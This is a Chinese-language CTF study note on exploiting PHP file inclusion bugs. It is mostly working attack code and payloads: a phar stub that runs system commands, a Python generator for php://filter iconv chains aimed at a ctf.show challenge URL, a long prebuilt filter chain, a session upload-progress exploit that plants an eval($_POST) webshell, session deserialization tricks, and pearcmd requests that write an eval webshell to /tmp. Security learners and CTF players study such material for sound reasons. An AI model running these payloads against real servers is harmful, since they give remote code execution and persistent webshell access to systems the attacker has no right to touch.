---
title: "php文件包含漏洞"
modDatetime: 2025-01-20T21:06:41.000+08:00
description: "PHP 文件包含漏洞、伪协议、日志包含与 session 包含利用记录"
tags: ["php"]
---

## 包含可控gz文件 + .phar RCE

include对phar有特殊处理，**当文件名包含.phar时**，会对识别出的压缩文件（比如gz）进行解压，然后再继续处理。从而让一个include，变成了**解压再include**，这就可以用来绕过内容关键字的匹配。

![](assets/php文件包含漏洞/Pasted%20image%2020251217222613.png)

```php
<?php

# set phar.readonly = Off in php.ini
@unlink("a.phar");
$phar = new Phar("a.phar");
$phar->startBuffering();
$phar->setStub("<?php system('ls'); __HALT_COMPILER();");  # 要执行的php代码必须写在这里，以__HALT_COMPILER();结尾
$phar->addFromString("test.txt", "abc");
$phar->stopBuffering();
```

然后压缩，上传，include即可。文件名比如a.phar.gz， a.pharabc.html

## 当要求包含的文件名中必须有特定字符

像这样

```php
if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
	include ($file . '.php');
}
```

    可以考虑使用woofers/../flag这样来回到上级目录再重新进入想要的文件
    **注意：**
    这里实际上存在的文件是 woofers.php、index.php
    本地测试时woofers.php/../flag和woofers/../flag均可以
    但是当时刷题时 只有woofers/../flag可以，不知道咋回事
    payload = ?catogory=php://filter/read=convert.base64-encode/resource=woofers/../flag.php

## 无法写入

### filter链无中生有

[原文](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
[tttang](https://tttang.com/archive/1395/)

配合`file_get_contents`也可以写马

**限制**
只能生成有限长度的任意字符（太长会URI TOO LARGE或者直接静默不往下处理）
本地测试只能生成54个字符

```python
import requests
import base64

file_to_use = "/etc/passwd"

base64_payload = base64.b64encode('<?=`ls /`; ?>'.encode()).decode()

base64_payload = base64_payload.replace('=','')

conversions = {
    '+' : 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '/' : 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '0' : 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    '1' : 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2' : 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3' : 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4' : 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2',
    '5' : 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE',
	'6' : 'convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7' : 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '8' : 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9' : 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'A' : 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'B' : 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C' : 'convert.iconv.UTF8.CSISO2022KR',
    'D' : 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    'E' : 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'F' : 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'G' : 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H' : 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'I' : 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'J' : 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'K' : 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'L' : 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'M' : 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'N' : 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'O' : 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'P' : 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'Q' : 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R' : 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
	'S' : 'convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    'T' : 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    'U' : 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'V' : 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'W' : 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'X' : 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'Y' : 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
	'Z' : 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'a' : 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'b' : 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'c' : 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'd' : 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'e' : 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'f' : 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g' : 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'h' : 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'i' : 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
	'j' : 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'k' : 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'l' : 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'm' : 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'n' : 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'o' : 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'p' : 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q' : 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'r' : 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    's' : 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    't' : 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'u' : 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'v' : 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932',
    'w' : 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'x' : 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'y' : 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'z' : 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
}


# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"
url = "http://9d9bb361-ed34-4fb7-aecf-7b5429c61108.challenge.ctf.show/index/testJson"
r = requests.get(url, params={
    "data": '{' + f'"name":"guest","__template_path__":"{final_payload}"' + '}'
})

print(r.text)
```

同时也可以通过php://filter生成图片头信息,绕过检测
https://github.com/Taiwan-Tech-WebSec/Bug-Report/issues/91

`filter-chain`

```php
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd
```

### 日志文件包含

1. 包含服务器框架日志

需要绝对路径,日志文件名,位置可知.

首先获取服务器根目录，
包含`/proc/8/cmdline`获得`WorkerMan: master process start_file=/var/www/html/webrooth1xaa/start.php`,结合本地的start.php位置可知,根目录为/var/www/html/webrooth1xaa

包含`<?php ... ?>`,将产生`include <?php ... ?>`错误,写入日志文件中,再包含日志文件

### session文件包含

题目[easy_include](https://ctf.show/challenges#easy_include-4260)

考点一:
file伪协议除了通过`file:///<PATH>`访问，也可以通过`file://localhost/<PATH>`访问
理论上可以通过`file://<IP>/<PATH>`访问, 但可能实际上不被允许, 只有`file://127.0.0.1/<PATH>`可行

考点二:
文件包含

exp：

```python
import requests
url = ""
data = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>',
    '1': 'localhost/tmp/sess_aaa', # include file://localhost/tmp/sess_aaa
    'cmd': 'system("ls /");'
}
file = {
    'file': 'fakeFile'
}
cookies = {
    'PHPSESSID': 'aaa'
}
response = requests.post(url=url, data=data, files=file, cookies=cookies)
print(response.text)
```

最终session文件中内容为 `...upload_progress_<?php eval($_POST["cmd"]);?>...`

配置要求：
**session.upload_progress.enabled = on**
**session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"** (默认值)
session.use*strict_mode = 0 (默认值) || session.auto_start = 1 (非默认值) || 代码中执行session_start() || 都不满足好像也可以。。。
session.upload_progress.cleanup = off (否则需要进行条件竞争， 默认是on)
session.upload_progress.prefix = "upload_progress*" (不重要)

原理：
[文章 :)](https://www.freebuf.com/articles/web/288430.html)

当session.use_strict_mode = 0时可以手动设置Cookie中的PHPSESSID，从而达到自定义文件名的效果, 此时必须手动设置PHPSESSID，否则不会生成session文件
当session.use_strict_mode = 1时，依赖与服务器自动创建session文件(上传文件时)，在手动随机设置PHPSESSID后，响应中会返回PHPSESSID的值
当上传一个文件时，若session.upload_progress.enabled = on 指示跟踪文件上传过程信息，session.upload_progress.name指示从哪个(POST)变量中获取并写入信息，session.upload_progress.prefix指示写入的信息的前缀

如果session.use_strict_mode = 0 && session.upload_progress.cleanup = on时，需要从响应中获取PHPSESSID，但是等你获取到了PHPSESSID，session文件已经被清空了，这时就不能成功包含session文件

**session文件路径**
常见路径：
/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
配置：
session.save_path

### session反序列化

应用情景

- 混用了php和php_serialize两个serialize_handler
- 字符串逃逸
- 文件写？

a:1:{s:4:"name";s:44:`"|O:1:"T":1:{s:4:"attr";s:15:"whoami>/tmp/res"`;}
a:1:{s:4:"name";s:44:"|`O:1:"T":1:{s:4:"attr";s:15:"whoami>/tmp/res";}`

**session.serialize_handler = php** (默认)
`sess|s:5:"hello";`

在session_start时候反序列化`|`后的部分, 直到遇到`;`

**session.serialize_handler = php_binary**
`#sessionsessionsessionsessionsessions:1:"a";`
通过读取第一个字符串得到键的长度(变成10进制)

**session.serialize_handler = php_serialize**
`a:1:{s:4:"sess";s:3:"abc";}`

如果这里用php_serialize, 且session中某个键的值可控, 可以写入:
`a:1:{s:4:"sess";s:3:"ab|PAYLOAD";}`, 这里PAYLOAD替换成真正的payload

然后再找个共享session,并且handler为`php`的, 那么前面就会被识别为键, 而PAYLOAD会被反序列化

字符串逃逸的见`2024qwb platform`
比如
`b|s:12:"evalevaleval";sess|s:10:";a|PAYLOAD";`
本来是

```json
{
  "b": "evalevaleval",
  "sess": ";a|PAYLOAD"
}
```

删掉system, sys
得到`b|s:12:"";sess|s:10:";a|PAYLOAD";`
变成

```json
{
  "b": "\";sess|s:10:",
  "a": "反序列化后的对象"
}
```

条件:

- 对session文件进行了插入或删除的操作 ( 比如删除恶意函数 )

### pearcmd包含

利用条件：
php.ini里面register_argc_argv设置为On，此时会将请求参数注册为argv，从而执行pear命令

`pear create-config /<?=@eval($_REQUEST('pass')); /tmp/mekrina.php`

常见路径

```
/usr/local/lib/php/pearcmd.php
/usr/share/php/pearcmd.php
```

注册argv的时候是用+分割，所以能正确传递参数lang

```
/?+config-create+/&lang=../../../../../../../../../../../../../../../../../../../../../../../../usr/share/php/pearcmd&/<?=@eval($_POST['cmd']);?>+/tmp/mekrina.php
```

实际执行的是
pear config-create `/&lang=../../../../../../../../../../../../../../../../../../../../../../../../usr/share/php/pearcmd&/<?=@eval($_REQUEST['cmd']);?>` /tmp/mekrina.php

然后再包含mekrina.php即可
